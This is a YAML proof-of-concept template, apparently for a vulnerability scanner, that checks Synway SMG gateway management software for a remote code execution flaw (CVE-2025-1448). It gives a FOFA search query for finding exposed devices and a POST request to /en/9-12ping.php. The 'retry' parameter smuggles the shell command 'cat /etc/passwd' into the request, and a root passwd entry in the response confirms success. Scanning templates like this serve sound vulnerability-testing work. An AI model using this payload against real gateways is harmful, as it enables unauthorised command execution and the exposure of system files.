id: poc-yaml-synway-smggateway-rce
info:
  name: Synway SMG网关管理软件 /9-12ping.php 远程代码执行漏洞（CVE-2025-1448）
  severity: critical
  tags:
  - rce
  - CVE-2025-1448
  finger: smg_gateway_management_software
  fofa: body="text ml10 mr20" && title="网关管理软件"
requests:
- method: POST
  path: /en/9-12ping.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: enable_radius=on&enable_auth=on&source_ip=&radius_address=&shared_secret=foobar&radius_address2=&shared_secret2=&timeout=3&retry=';cat
    /etc/passwd;'&alive=20&save=Save
  expression: "status_code == 200 && \ncontains(body,\"window.parent.location.href=\"\
    ) &&\nmatches(body, \"root:.*:0:0:\")\n"
variables: {}
transport: http
